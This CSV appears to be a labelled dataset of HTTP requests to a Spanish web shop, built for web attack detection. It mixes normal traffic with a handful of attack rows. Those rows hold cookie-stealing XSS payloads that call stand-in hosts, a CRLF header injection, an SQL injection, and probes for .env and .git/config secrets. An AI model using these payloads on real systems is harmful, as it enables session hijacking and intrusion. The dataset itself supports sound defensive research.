text_input,method,url_path,query_params,request_payload,user_agent,response_status,label,attack_type,source
GET /tienda1/publico/anadir.jsp [SEP] id=2&nombre=Jam%F3n+Ib%E9ricosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&precio=39&cantidad=74&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D7EC27EB30F4A371FAC7ED4F38DE654F localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9ricosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&precio=39&cantidad=74&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/carrito.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=1C4695FCABFEF2B2D4F70068BE4138FE localhost:8080  ,GET,/tienda1/publico/carrito.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /node_modules/.git/config [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/node_modules/.git/config,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/global/estilos.css [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=93067846416E7B8867A5A6E31840AC10 localhost:8080  ,GET,/tienda1/global/estilos.css,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/pagar.jsp [SEP] modo=insertar&precio=1525&B1=Confirmar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=9F9FF45B681CE0D8F509A75D48079F82 localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modo=insertar&precio=1525&B1=Confirmar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=gran25&password=TodITo&nombre=Ranen&apellidos=Galdo+Palac%EDn&email=marysia-paramor%40programaciones.com.mg&dni=75834762J&direccion=C%2F+San+Miguel%2C+111+6%3FF&ciudad=Valencia+de+Don+Juan&cp=15171&provincia=Burgos&ntc=1041858100277526&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=3F678CAA17E7011B2FC33FB916103244 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=gran25&password=TodITo&nombre=Ranen&apellidos=Galdo+Palac%EDn&email=marysia-paramor%40programaciones.com.mg&dni=75834762J&direccion=C%2F+San+Miguel%2C+111+6%3FF&ciudad=Valencia+de+Don+Juan&cp=15171&provincia=Burgos&ntc=1041858100277526&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=8529&B1=Confirmar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=7F733DEF50177219CB99EB493AD1A5D5 localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=8529&B1=Confirmar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=2&nombre=Vino+Rioja&precio=85&cantidad=42&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=32AED26F16A87919ACEB6855E7718884 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=85&cantidad=42&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=3&nombre=Vino+Rioja&precio=85&cantidad=20&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=28672953D0A00B246B3FEFA07706A3C1 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=3&nombre=Vino+Rioja&precio=85&cantidad=20&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&login=bette-an&pwd=jARAn6rO&remember=off&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=DA1BC8399E937E8835B1D9334031C78C localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&login=bette-an&pwd=jARAn6rO&remember=off&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6CC0745976FDC50B85B82925665632D4 localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
PUT /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=3714&B1=Confirmar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=1115961E3A7026F9AE893CAD76B9C975 localhost:9090  ,PUT,/tienda1/publico/pagar.jsp,,modo=insertar&precio=3714&B1=Confirmar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/imagenes/zarauz.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=4B35990AF9DB0B2E00F420ED124EE480 localhost:8080  ,GET,/tienda1/miembros/imagenes/zarauz.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/caracteristicas.jsp [SEP]  id=2 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=848F89E94B67A8EDD1A2AA205F601843 localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,id=2,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/productos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=FD4EEB9D9A763681AC0E5EA9BF99F9E1 localhost:8080  ,GET,/tienda1/publico/productos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=seniuk&password=t0aspa70ble&nombre=Lucio&apellidos=Sogorb+Ipamo&email=astor%40caspospas.py&dni=81403734H&direccion=Calle+Polvorin%2C+117%2C+&ciudad=Tramaced&cp=49540&provincia=Palencia&ntc=9904632053725609&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C49940475A26AD34E5BFF94CFA8C4C92 localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=seniuk&password=t0aspa70ble&nombre=Lucio&apellidos=Sogorb+Ipamo&email=astor%40caspospas.py&dni=81403734H&direccion=Calle+Polvorin%2C+117%2C+&ciudad=Tramaced&cp=49540&provincia=Palencia&ntc=9904632053725609&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/logo.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=8B0CCFCE6D1059EE639820CFBCEA795F localhost:8080  ,GET,/tienda1/imagenes/logo.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
"POST / [SEP]  {""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2025-03-26"",""clientInfo"":{""name"":""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"",""version"":""1.0""},""capabilities"":{}}} [SEP] Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) [SEP]     ",POST,/,,"{""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2025-03-26"",""clientInfo"":{""name"":""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"",""version"":""1.0""},""capabilities"":{}}}",Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),405,1,other_anomaly,loki_exp1
POST /tienda1/publico/vaciar.jsp [SEP]  B2=Vaciar+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=8B60E3C5C701661547856B3A90FDFD1C localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2=Vaciar+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET / [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=8AB55E6A775407938E405CA1F9EFB1D8 localhost:8080  ,GET,/,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=brookes&password=Co5r5525e&nombre=Plutarco&apellidos=Retamal&email=rigand%40suncorp.mk&dni=83677248M&direccion=Pedro+De+La+Gasca+140+&ciudad=Alc%FAdia+de+Crespins%2C+l%27&cp=17249&provincia=La+Rioja&ntc=6040888757825695&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=46EE8C60E8B967954629016BC4EF2932 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=brookes&password=Co5r5525e&nombre=Plutarco&apellidos=Retamal&email=rigand%40suncorp.mk&dni=83677248M&direccion=Pedro+De+La+Gasca+140+&ciudad=Alc%FAdia+de+Crespins%2C+l%27&cp=17249&provincia=La+Rioja&ntc=6040888757825695&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/vaciar.jsp [SEP]  B2A=Vaciar+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=617CB4A99F3606CE5231BE544C1831CF localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2A=Vaciar+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=hew%2B%2Fs&password=z51er94&nombre=Aliana&apellidos=Pedraza+Almendro&email=barkley%40tecnoindomo.sj&dni=36793762H&direccion=C%2F+Asensio+y+Toledo+50%2C+13%3FG&ciudad=Rillo&cp=02131&provincia=Soria&ntc=2979562523275482&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=A7E450F7A59C18F5C48D0EDC82085936 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=hew%2B%2Fs&password=z51er94&nombre=Aliana&apellidos=Pedraza+Almendro&email=barkley%40tecnoindomo.sj&dni=36793762H&direccion=C%2F+Asensio+y+Toledo+50%2C+13%3FG&ciudad=Rillo&cp=02131&provincia=Soria&ntc=2979562523275482&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /stage.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/stage.env,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=3243&B1=Pasar+por+caja [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=15852D4693C265A1D609E7C1396EB3B1 localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=3243&B1=Pasar+por+caja,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=threader&password=dESCOlocaDO&nombre=Mallki&apellidos=Moreno+Undurraga&email=stevenin%40ceramicasmi%F1o.mn&dni=70153244R&direccion=C%2F+Vapor%2C+148%2C+2%3FA&ciudad=Espluga+Calba%2C+L%27&cp=03153&provincia=Palencia&ntc=5838987688567542&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=B961303B44D91A2BC1B9A37A4783346C localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=threader&password=dESCOlocaDO&nombre=Mallki&apellidos=Moreno+Undurraga&email=stevenin%40ceramicasmi%F1o.mn&dni=70153244R&direccion=C%2F+Vapor%2C+148%2C+2%3FA&ciudad=Espluga+Calba%2C+L%27&cp=03153&provincia=Palencia&ntc=5838987688567542&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
PUT /tienda1/publico/anadir.jsp [SEP]  id=3&nombre=Vino+Rioja&precio=39&cantidad=93&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=F0EDDB533B9A894E2FA75C5C6D941BFB localhost:9090  ,PUT,/tienda1/publico/anadir.jsp,,id=3&nombre=Vino+Rioja&precio=39&cantidad=93&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
"GET /favicon.ico [SEP]   [SEP] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36 [SEP]     ",GET,/favicon.ico,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36",404,1,scanning,loki_exp1
GET /tienda1/imagenes/cmenbul.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=84C89AB210C1046A5293E0AC71A5E939 localhost:8080  ,GET,/tienda1/imagenes/cmenbul.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /IISSamples/sdk/asp/database/SimpleQuery_VBScript.asp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=DE0CF3F973271857EA6C90C82579660A localhost:8080  ,GET,/IISSamples/sdk/asp/database/SimpleQuery_VBScript.asp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=2DC04C58034D9693A9580EF025426C1A localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=viviana&password=DeSCOngEstI%D3N&nombre=Gualberto&apellidos=Reinado+Nurnberg&email=valentova0%40longboarders.ir&dni=13369501S&direccion=Entrada+Conoles+160+10%3FA&ciudad=Berzosa+de+Bureba&cp=23140&provinciaA=Barcelona&ntc=8597171224843320&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=8EA5F5E65F5A20530BB35412A7C38193 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=viviana&password=DeSCOngEstI%D3N&nombre=Gualberto&apellidos=Reinado+Nurnberg&email=valentova0%40longboarders.ir&dni=13369501S&direccion=Entrada+Conoles+160+10%3FA&ciudad=Berzosa+de+Bureba&cp=23140&provinciaA=Barcelona&ntc=8597171224843320&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/3.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=A680CFC1E718755D5B0B934B251F8FA4 localhost:8080  ,GET,/tienda1/imagenes/3.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /application.yml.old [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/application.yml.old,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/miembros/index.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=AFF50793955FF2A62086203A5C084F3C localhost:8080  ,GET,/tienda1/miembros/index.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/imagenes/zarauz.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C318226CD1FA5CAF9D1BAD088FA020B9 localhost:8080  ,GET,/tienda1/miembros/imagenes/zarauz.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/entrar.jsp [SEP] errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=32896D0553E9066FB2D16765F34DBE39 localhost:8080  ,GET,/tienda1/publico/entrar.jsp,errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,xss,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=zaharoff0&pwd=e5f215o6o&remember=off&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=021B4E52487622C536B7C409FC6569DD localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=zaharoff0&pwd=e5f215o6o&remember=off&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
PUT /tienda1/publico/anadir.jsp [SEP]  id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=69&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=E4323FC693DFE906D3826BB41B1CDD0E localhost:9090  ,PUT,/tienda1/publico/anadir.jsp,,id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=69&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=469&B1=Confirmar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=CA275947898DFA926FB8D4C64B039F0D localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=469&B1=Confirmar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=hamzeh&password=7s0Av07rIDo&nombre=Katherina&apellidos=Valido+Casademont&email=chang-kang%40juegois.sh&dni=57978068J&direccion=Travesia+De+Fernando+Sasiain+35+2%3FC&ciudad=Mucientes&cp=09612&provincia=La+Rioja&ntc=3781036501381167&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7BAB4C5E45FFD86D21E23DCE3AFCCB23 localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=hamzeh&password=7s0Av07rIDo&nombre=Katherina&apellidos=Valido+Casademont&email=chang-kang%40juegois.sh&dni=57978068J&direccion=Travesia+De+Fernando+Sasiain+35+2%3FC&ciudad=Mucientes&cp=09612&provincia=La+Rioja&ntc=3781036501381167&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/global/titulo.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=B2CA915DECCC939B8C8B30227B02DDDE localhost:8080  ,GET,/tienda1/global/titulo.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /developerslv/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/developerslv/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/entrar.jsp [SEP] errorMsg=Credenciales+incorrectasany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=688541B647342987ACC666933DB75C43 localhost:8080  ,GET,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectasany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar%22+AND+%221%22%3D%221&login=brownlee&pwd=aluminada&remember=off&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=4B2966415E77A36CF99F5C35C931E9D0 localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar%22+AND+%221%22%3D%221&login=brownlee&pwd=aluminada&remember=off&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/nuestratierra.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7446966D12592DAFA41E779BCA1DDC93 localhost:8080  ,GET,/tienda1/imagenes/nuestratierra.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=rockford&password=eng68nd13i8ient5&nombre=Saiguen&apellidosA=Gramunt+Alzuria&email=berthels-dahlbeck%40muevemiweb.br&dni=87238782N&direccion=Pozo+188+3%3FG&ciudad=C%E1ceres&cp=06197&provincia=Valencia&ntc=8495227312439801&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=15A5039D61BF6AD28C8FECDD40393CF0 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=rockford&password=eng68nd13i8ient5&nombre=Saiguen&apellidosA=Gramunt+Alzuria&email=berthels-dahlbeck%40muevemiweb.br&dni=87238782N&direccion=Pozo+188+3%3FG&ciudad=C%E1ceres&cp=06197&provincia=Valencia&ntc=8495227312439801&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
